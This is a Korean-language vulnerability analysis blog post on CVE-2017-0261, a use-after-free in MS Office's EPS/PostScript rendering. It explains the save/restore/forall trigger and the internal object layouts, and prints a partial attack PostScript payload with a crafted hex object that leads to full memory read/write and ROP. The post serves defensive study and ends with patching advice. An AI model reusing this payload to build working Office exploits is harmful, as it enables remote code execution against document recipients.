---
layout: post
title: CVE-2017-0261 취약점 분석
subtitle: Use After Free vulnerability in MS Office
categories: CVE
tags: [cve-2017-0261, MSOffice]
---
# **CVE-2017-0261, Use After Free 방식을 이용한 MS Office 원격 코드 실행 취약점**

# **1. 소개**

CVE-2017-0261은  MS Office 제품군에서 발생한 취약점으로, 취약대상에 UseAfterFree 공격을 통해 원격 코드 실행이 가능한 특징을 가지고 있다. 시큐레터 기술연구소 NOM@L 분석팀과 함께 해당 취약점과 취약점을 공격한 방식에 대해 알아보자.

## **1.1 공격 방식 소개**

Use After Free 공격 방식을 파악하기 전, 먼저 프로세스 내 동적 메모리 사용 방식에 대해 간략히 파악할 필요가 있다. 메모리 사용 방식은 아래의 세가지로 나누어 볼 수 있다.

- 할당
    - 프로세스에 필요한 데이터를 생성, 활용하기 위해 특정 메모리 구역을 정하는 행위
- 사용
    - 정한 특정 메모리 구역에 데이터를 읽기, 쓰기, 실행하는 행위
- 해제
    - 사용 후 메모리구역을 추후 다시 활용하기 위해 사용 종료하는 행위

이때 이미 쓰임을 다하고 해제된 메모리에 대하여 접근 및 활용이 가능하게 될 경우 Use After Free라고 하며, 이를 이용한 공격을 Use After Free 공격이라고 칭한다. UAF를 통해 아래의 결과가 발생할 수 있다.

- 무결성
    - 이전에 해제된 메모리를 사용하면 해당 메모리 영역이 할당되어 다른 곳에서 적절하게 사용된 경우 유효한 데이터 손상 가능
- 가용성
    - 이전에 해제된 데이터를 사용한 후 청크 통합이 발생하면 유효하지 않은 데이터가 청크 정보로 사용될 때 프로세스 충돌 가능
- 액세스 제어(명령 처리)
    - 청크 통합이 발생하기 전에 악의적인 데이터가 입력되면 임의의 코드를 실행하기 위해 write-what-where 프리미티브 활용 가능

(OWASP 참조)

(Write-What-Where - 종종 버퍼 오버플로우의 결과로 공격자가 임의의 위치에 임의의 값을 쓸 수 있는 모든 조건)

# **2. 취약점 분석**

본 취약점은 **EPS Image를 렌더링하는 과정에서 발생하는 Use After Free를 악용한 취약점**이다.

![image1.png](/assets/images/cve-2017-0261-img/image1.png)

## **2.1 취약점 발생 원인**

- PostScript에는 save, restore, forall등의 Operator가 존재
    - save - 로컬 VM Snapshot 생성
    - restore - 생성된 로컬 VM Snapshot 회수
- 해당 조합을 forall Operator와 결합하여 사용하게 되면 Use After Free 취약점의 조건 유발

save, restore, forall Operator 정보

| Operator | How To Use | 설명 |
| --- | --- | --- |
| save | - save save | VM Snapshot 생성 |
| restore | save restore - | VM Snapshot 반환 |
| forall | array proc forall | 각 요소에 대해서 프로시저인 proc 실행, 첫 번째 피연산자의 요소를 열거 |

## **2.2 PostScript 구조 분석**

- PostScript Object 구조체

```
struct ps_object
{
    dword type; // type
    dword attribute;
    dword value1; // 해당 개체에 대한 변수 이름
    dword value2; // simple object -> 저장된 값에 대한 포인터, composite object -> 값이 저장된 구조체 포인터
}
```

취약점 분석에 앞서 필수 확인해야 될 부분은 다음과 같다.

- Composite Object
- String or Array Object

| Simple Object | Composite Object |
| --- | --- |
| boolean | array (0x30000) |
| fontID | dictionary |
| integer | file |
| mark | gstate |
| name | packedarray |
| null | save |
| operator | string (0x500) |

이 중 중점적으로 확인할 string과 array의 type은 각각 0x500, 0x30000이다.

- Composite Object 구조

```
struct Composite Object
{
    dword   +0x0
    dword   +0x4
    dword   +0x8
    dword   +0xC
    dword   +0x10
    dword   +0x14
    dword   +0x18
    dword   +0x1C
    dword   +0x20
    dword   +0x24     -> p_struct - type별 Object 구조체 포인터
    dword   +0x28
    dword   +0x2C     -> size - 구조의 데이터 크기
}
```

- String Object 구조체

```
struct String Object
{
    dword    +0x0
    dword    +0x4       -> before offset
    dword    +0x8
    dword    +0xC
    dword    +0x10
    dword    +0x14
    dword    +0x18
    dword    +0x1C
    dword    +0x20      -> ptr_object - 실제 String이 배치된 주소 포인터
    dword    +0x24      -> size
}
```

- Array Object 구조체

```
struct Array Object
{
    dword    +0x0
    dword    +0x4       -> before offset
    dword    +0x8
    dword    +0xC
    dword    +0x10
    dword    +0x14
    dword    +0x18
    dword    +0x1C
    dword    +0x20
    dword    +0x24      -> size
    dword    +0x28      -> ptr_object - Array가 배치된 주소 포인터
}
```

### **PostScript 오브젝트 파싱 프로세스**

- **PostScript Object → Heap (Object Pointer가 모여 있는, Composite Object) → Composite Object → Heap (String Object) → String Object → String**

## **2.3 취약점 발생 지점 디버깅**

### **2.3.1 UAF를 악용한 공격 페이로드 작성**

- 취약점이 일어나는 PostScript 정보

```
/l100
{ 1000
	{ l102 length string dup 0 l102 putinterval } repeat
} bind def

/l101
{
	/l102 exch def
	/l103 0 def
	/l53 (
			/l54 exch def l57 l55 l54 put
			/l55 l55 1 add def
		) def

	/l56 (
			l62 restore
			l100
			l61 0 l60 put
		) def

	/l57 68 array def	-> l57, Leak Data
	/l55 1 def
	/l59 ( l56 cvx exec ) cvx def
	/l60 ( l53 cvx exec ) cvx def
	/l61 1 array def 100
	{
		/l55 1 def
		l61 0 l59 put
		/l62 save def
		/l63 39 string def -> l63, Uaf_String
		l63 l61 forall

		/l116 l57 32 get def  -> l57, Leak이 된 것인지 확인

		....
		....
		....
}

{
	/l136 340 string dup 0 <04000000> putinterval 36 4 putData dup 40  <3700000030000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000030000000000000000005000000054000000000000000000000000000000000000000000000000000000000000000000000000000000840000000000000004000000880000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFF0400000014010000B8000000000000000000000000000000000000000000000000000000000000000000000000000000E800000000000000FFFFFF7FEC000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFF7F000500000000000000000000B4000000> putinterval 48 292 putData def l136 l101
	-> l136, Alloc_String
    ....
    ....
    ....
}

```

이 중 중요한 구문만 실행 순서에 맞춰 따로 확인해보면 다음과 같다.

```
/l57 68 array def

/l62 save def

/l63 39 string def

l63 l61 forall

l62 restore

l100 -> 이게 쭉 따라가보면 l136이 적용되는거 확인 가능

/l116 l57 32 get def
```

실제 UAF가 발생한 지점의 메모리를 확인하면 다음과 같다.

![image2.png](/assets/images/cve-2017-0261-img/image2.png)

해당 표를 통해 Composite Object를 사용하던 공간을 restore 이후 Reuse 한 것을 확인할 수 있다. PostScript에서 사용하는 Compostie Object는 궁극적으로 Compostie Object를 통해 실제 위치에 접근하기 때문에 해당 부분이 Reuse됨으로써 Use After Free가 가능하게 된다. 이후, l57은 해제된 메모리에 String 값들을 Leak 할 수 있게 된다.

![image3.png](/assets/images/cve-2017-0261-img/image3.png)

![image4.png](/assets/images/cve-2017-0261-img/image4.png)

- **l57은 array 형태로 해제된 변수의 String에 대해 0x1 부터 Memory Leak 발생**
- **Leak 데이터를 바탕으로 Reuse된 String 값을 변경하여 추후에 진행할 실제 공격수행을 위한 코드 흐름 완성**

![image5.png](/assets/images/cve-2017-0261-img/image5.png)

### **2.3.2 공격 페이로드 작성 후 실제 공격 수행**

기본적인 코드 흐름은 상술한 UAF가 일어나는 구간과 그 외 필요한 값들을 찾는 방식과 동일하다. 다른점은 다음과 같다.

- UAF가 일어나는 부분의 Type이 String → Array
- 해당 Array에 52번째 Index에서 restore 실행

Reuse 된 이후 Composite Object 전후 데이터는 다음과 같다.

![image6.png](/assets/images/cve-2017-0261-img/image6.png)

**빨간색으로 표시한 부분은 [2.3.1 UAF를 악용한 공격 페이로드 작성] 과정에서 생성한 코드흐름이 존재한 주소**

해당 부분을 따라가보면 다음과 같은 Array를 확인할 수 있다.

![image7.png](/assets/images/cve-2017-0261-img/image7.png)

이 Array 구성 중 55번째에 Array Type에 구성을 확인할 수 있다.

![image8.png](/assets/images/cve-2017-0261-img/image8.png)

해당 Array에 Data를 확인해보면 첫 번째 인덱스에 String을 확인할 수 있다.

![image9.png](/assets/images/cve-2017-0261-img/image9.png)

해당 String Object를 확인해보면 다음과 같다.

![image10.png](/assets/images/cve-2017-0261-img/image10.png)

- **빨간색은 실제 String이 시작하는 메모리 위치, 파란색은 Size**
- **해당 String은 0x0부터 0x7fffffff까지 다 사용**
- **즉, 해당 String은 모든 메모리에 접근, 읽기, 쓰기가 가능**

**따라서, 어떤 String이 모든 메모리에 접근, 읽기, 쓰기가 가능해지고, 이를 이용하여 Gadget들을 모아 ROP를 실행시키는 방식으로 진행된다.**

# **취약점 대응 방안**

사내 운영 환경을 고려한 보안 업데이트

관련 링크 - [Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0261)
